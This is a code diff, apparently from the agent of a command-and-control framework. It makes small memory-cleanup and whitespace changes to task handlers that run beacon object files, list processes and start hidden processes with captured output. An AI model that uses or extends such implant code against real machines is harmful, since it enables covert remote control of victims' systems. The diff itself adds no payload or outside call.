@@ -122,6 +122,8 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		default: break;
 		}
 	}
+	if (inPacker)
+		MemFreeLocal((LPVOID*) &inPacker, sizeof(Packer));
 }
 
 void Commander::CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -320,7 +322,8 @@ void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	outPacker->Pack32(taskId);
 	outPacker->Pack32(commandId);
 
-	bofPacker->Clear();
+	bofPacker->Clear(TRUE);
+
 }
 
 void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -581,7 +584,7 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	NTSTATUS NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &spiSize);
 	if (!NT_SUCCESS(NtStatus)) {
 		spiSize += 0x1000;
-		spi = (PSYSTEM_PROCESS_INFORMATION)MemAllocLocal(spiSize);
+		spi = (PSYSTEM_PROCESS_INFORMATION) MemAllocLocal(spiSize);
 		if (spi)
 			NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, spi, spiSize, &spiSize);
 	}
@@ -744,6 +747,7 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 
 	BOOL result = ApiWin->CreateProcessA(prog, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+
 
 	if (result) {
 		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);
